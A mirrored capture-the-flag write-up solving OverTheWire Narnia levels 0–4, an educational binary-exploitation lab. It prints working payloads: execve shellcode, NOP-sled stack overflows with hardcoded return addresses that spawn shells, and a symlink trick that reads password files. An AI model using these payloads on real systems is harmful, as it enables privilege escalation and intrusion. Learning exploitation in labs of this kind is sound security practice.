# :game_die: OverTheWire Narnia Wargame 0–4 Writeup

> **Original Source:** [OverTheWire Narnia Wargame 0–4 Writeup](https://infosecwriteups.com/overthewire-narnia-wargame-0-4-writeup-501a474fbcef)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# OverTheWire Narnia Wargame 0–4 Writeup


In this post I will be writing up the solutions of challenges 0–4 from the Narnia series on OverTheWire. Narnia is an online cybersecurity challenge where you can learn and practice basic binary exploitation. You connect to the machines with ssh and get access to the vulnerable code and programs.


The challenges are in the /narnia directory and passwords for each level are in /etc/narnia/pass/narniaX where X is the machine you are currently in.


We connect to the first machine with the command: ssh narnia0@narnia.labs.overthewire.org -p 2226. The password is: narnia0


Link to the site: [https://overthewire.org/wargames/narnia/](https://overthewire.org/wargames/narnia/)

## Narnia 0 Solution


We head to the /narnia directory and find the source code and binary there. First, let`s execute the program.


```
narnia0@narnia:~$ cd /narnia
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: test
buf: test
val: 0x41414141
WAY OFF!!!!
```


Now, let’s take a look at the source code.


```
#include <stdio.h>
#include <stdlib.h>

int main(){
long val=0x41414141; /*Puts the value we want to overwrite on the stack*/
char buf[20]; /*Sets the buffer length to 20 bytes*/

printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
printf("Here is your chance: ");
scanf("%24s",&buf); /*Reads input into buffer (24 char limit on buffer, which is enough to fill the buffer and then the 4 bytes for deadbeef)*/

printf("buf: %s\n",buf); /*Prints contents of buffer*/
printf("val: 0x%08x\n",val); /*Outputs value we want to overwrite*/

if(val==0xdeadbeef){ /*If value == 0xdeadbeef*/
setreuid(geteuid(),geteuid()); /*Make the binary use the SUID and GUID*/
system("/bin/sh"); /*Run /bin/sh to spawn a shell*/
}
else { /*If the value isn't 0xdeadbeef then*/
printf("WAY OFF!!!!\n"); /*Print "WAY OFF!!!!" and then exit*/
exit(1);
}

return 0;
}
```


The challenge is straight forward, we need to change the val value from 0x41414141 to 0xdeadbeef to solve it. The scanf() function allows the user to enter 24 chars but the buf variable is 20 bytes so we can overwrite 4 bytes.


Let’s try to write 24 bytes as input and check if the address changes.


```
narnia0@narnia:/narnia$ python -c 'print 20 * "A" + "BBBB"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
```


As we can see, we were able to modify the original value of val with 0x42424242. We will do the same thing for 0xdeadbeef.


However, 0xdeadbeef needs to be in little endian format. This reversal is necessary because the machine (x86 architecture) uses little-endian byte ordering, that means it reads and stores data in reversed order. Little endian: An argument for little-endian order is that as you increase a numeric value, you may need to add digits to the left. For example, a higher non exponential number has more digits. Therefore an addition of two numbers often requires moving all the digits of a big endian ordered number in storage. This addition moves everything to the right.


You can learn more about endianness from here: [https://en.wikipedia.org/wiki/Endianness](https://en.wikipedia.org/wiki/Endianness)


We also need to add cat to the arguements to maintain shell. If we don’t add cat the shell will be instantly terminated after the program runs.


```
narnia0@narnia:/narnia$ (python -c 'print 20*"A" + "\xef\xbe\xad\xde"'; cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1

```


## Narnia 1 Solution


The next challenge gets a little more compilated. Let`s start by executing the program again.


```
narnia1@narnia:~$ cd /narnia/
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```


It seems that we need to initialize an environment variable named EGG. Let’s try to understand more by looking at the source code.


```
#include <stdio.h>

int main(){
int (*ret)();

if(getenv("EGG")==NULL){
printf("Give me something to execute at the env-variable EGG\n");
exit(1);
}

printf("Trying to execute EGG!\n");
ret = getenv("EGG");
ret();

return 0;
}
```


Here, the code will execute anything we put in the EGG environment variable, we only need to find a shellcode and set the EGG variable. I chose a random shellcode from the Exploit Database. Link: [https://www.exploit-db.com/exploits/44594](https://www.exploit-db.com/exploits/44594)


Here is the shellcode:


```
\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80
```


Now, we just need to export it as an environment variable and execute the program again.


```
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"'); /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2

```


## Narnia 2 Solution


First, let’s try to execute the program.


```
narnia2@narnia:~$ cd /narnia/
narnia2@narnia:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@narnia:/narnia$ ./narnia2 test
testnarnia2@narnia:/narnia$
```


The program just returns the string we enter to the terminal. Now let`s check the source code.


```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
char buf[128]; /*Declares the buffer length to be 128 bytes*/

if(argc == 1){
printf("Usage: %s argument\n", argv[0]); /*Display usage*/
exit(1);
}
strcpy(buf,argv[1]); /*Copy contents of arg 1 to buffer*/
printf("%s", buf); /*Print the buffer*/

return 0;
}
```


The program performs a simple operation of copying a command-line argument to a buffer and printing it. If an argument is provided, it copies that argument into a 128 byte buffer using strycpy. However, if the argument is larger than 128 bytes, it will overflow the buffer.


## Get Batu Ada Tutkun’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


We need to adjust the string size to precisely overwrite the return address. We can use gdb to disassemble the binary and view memory.


With our breakpoint set we can run our payload to determine the offset. Knowing the offset is important because we need to know the size of our exploit and knowing where to set the return address. To do this we will supply 140 “A”s plus 4 “B”s and see if our “B”s overwrite the Instruction Pointer (EIP) register.


So we can see that EIP register was not overwritten by our B’s so it looks like we need to reduce our A’s. We will reduce the number of A’s and try again. So we will send 136 A’s and 4 B’s and if that doesn’t work we will continue to reduce our number of A’s until we see our EIP register overwritten by our B’s.


Now we have our offset and know the size that we are working with. We need to craft our exploit. I will be using a shellcode from exploit database. Link: [https://www.exploit-db.com/shellcodes/49768](https://www.exploit-db.com/shellcodes/49768)


```
unsigned char code[] = "\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
```


Taking our payload of 136 A’s and replace them with a NOP sled (\x90), minus 25 bytes for our shellcode and 4 bytes for our EIP. The NOP sled is used to direct the CPU’s instruction execution flow to a desired destination. In this case our shellcode.


```
$(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "B"*4')
```


Let’s view the memory.


Picking a memory address somewhere in the middle should work. What will happen is the eip register will be overwritten with our NOP sled and slide into our shellcode. We have to craft a new payload.


```
$(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"')
```


We can see in the debugger that our payload executes a new program /bin/dash. This lets us know that our payload is ready.


We can test it on the binary now.


```
narnia2@narnia: ./narnia2 $(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"')
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3

```


## Narnia 3 Solution


Here is the source code:


```
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char argv){

int ifd, ofd;
char ofile[16] = "/dev/null"; /*Sets the output file to /dev/null (var size is 16 bytes)*/
char ifile[32]; /*Sets the variable size to 32 bytes*/
char buf[32]; /*Sets the buffer size to 32 bytes*/

if(argc != 2){ /*Print usage*/
printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
exit(-1);
}

/* open files */
strcpy(ifile, argv[1]); /*Copies arg to ifile var (this is vulnerable)*/
if((ofd = open(ofile,O_RDWR)) < 0 ){
printf("error opening %s\n", ofile); /*Error handler*/
exit(-1);
}
if((ifd = open(ifile, O_RDONLY)) < 0 ){
printf("error opening %s\n", ifile); /*Error handler*/
exit(-1);
}

/* copy from file1 to file2 */
read(ifd, buf, sizeof(buf)-1); /*Read content of In File*/
write(ofd,buf, sizeof(buf)-1); /*Write content to Out File*/
printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

/* close 'em */
close(ifd); /*Close both*/
close(ofd);

exit(1);
}
```


There is no boundary check on the input file. So if we overflow ifile, we could overwrite the ofile which is intialized with /dev/null.


An example of the binary’s usage is like this:


```
narnia3@narnia:/narnia$ touch /tmp/test
narnia3@narnia:/narnia$ ./narnia3 /tmp/test
copied contents of /tmp/LetsPlay to a safer place... (/dev/null)
```


We move to the /tmp directory since we control everything inside of it, now we need can start playing with the input file, we know the input buffer is 32 bytes, and the output file is 16 bytes, so we could technically make something like /tmp/”z”*27 (32-len('/tmp/')).


When you overflow the input variable, you also overwrite the null byte that defines where that variable’s string ends, the memory location where the outfile var starts remains the same, we can abuse this, and make the file something like /tmp/27bytes/tmp/file, and then symlink narnia4’s password to /tmp/27bytes/tmp/file, but also make a file called /tmp/file with read, write, execute permissions.


When we feed the binary this path it will overflow the buffer, overwrite the termination byte, so the input file is taken as /tmp/27bytes/tmp/file, but the output file is just /tmp/file.


Lets put this all into the test.


```
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp$ ln -s /etc/narnia_pass/narnia4 test
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp$ touch /tmp/test
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp$ chmod 777 /tmp/test
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp$ /narnia/narnia3 $(pwd)/test
copied contents of /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/outforchiv to a safer place... (/tmp/test)
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp$
```


We got it! We can cat the /tmp/test file and read the password.

## Narnia 4 Solution


We have arrived at the final challenge of this writeup, it is another buffer overflow to gain a shell similar to challenge 2.


Let’s try to execute the program…


```
narnia4@narnia:~$ cd /narnia/
narnia4@narnia:/narnia$ ./narnia4
```


Nothing happens… Let’s take a look at the source code.


```
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char environ;

int main(int argc,char argv){
int i;
char buffer[256];

for(i = 0; environ[i] != NULL; i++)
memset(environ[i], '\0', strlen(environ[i]));

if(argc>1)
strcpy(buffer,argv[1]);

return 0;
}
```


It is similar to challenge 2 but we don’t have any output or result from the program. We know the buffer size is 256 so we can start with that, next we need is to find where we overflow the return address.


```
$ gdb narnia4

(gdb) set disassembly-flavor intel
(gdb) run $(python -c 'print 264 * "A" + 4 * "B"')
Starting program: /narnia/narnia4 $(python -c 'print 264 * "A" + 4 * "B"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)
```


So we need 256 bytes and 4 more bytes to overwrite the return address.


Let’s find a return address using a shellcode.


```
(gdb) break *main+121
Breakpoint 1 at 0x8048524

(gdb) run $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 4 * "B"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia4 $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 4 * "B"')

Breakpoint 1, 0x08048524 in main ()
(gdb) x/100x $esp+600
0xffffd6e4: 0x00000000 0x00000009 0x080483b0 0x0000000b
0xffffd6f4: 0x000036b4 0x0000000c 0x000036b4 0x0000000d
0xffffd704: 0x000036b4 0x0000000e 0x000036b4 0x00000017
0xffffd714: 0x00000001 0x00000019 0xffffd74b 0x0000001a
0xffffd724: 0x00000000 0x0000001f 0xffffdfe8 0x0000000f
0xffffd734: 0xffffd75b 0x00000000 0x00000000 0x00000000
0xffffd744: 0x00000000 0xb9000000 0x47bfa236 0xde88977b
0xffffd754: 0x969dbe24 0x69e65cf5 0x00363836 0x00000000
0xffffd764: 0x00000000 0x616e2f00 0x61696e72 0x72616e2f
0xffffd774: 0x3461696e 0x90909000 0x90909090 0x90909090
0xffffd784: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd794: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd7a4: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd7b4: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd7c4: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd7d4: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd7e4: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd7f4: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd804: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd814: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd824: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd834: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd844: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd854: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd864: 0x50c03190 0x732f2f68 0x622f6868 0xe3896e69
```


We’ll use 0xffffd7b4 as it is in the middle of the *NOP sled*.


```
(gdb) run $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia4 $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"')

Breakpoint 1, 0x08048524 in main ()
(gdb) conti
Continuing.
process 22763 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded. Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
$
```


Looks like it worked. Let’s do the same outside of gdb.


```
narnia4@narnia:/narnia$ ./narnia4 $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"')
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5

```


Thanks for reading!

---

*Originally published on [Medium](https://infosecwriteups.com/overthewire-narnia-wargame-0-4-writeup-501a474fbcef). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
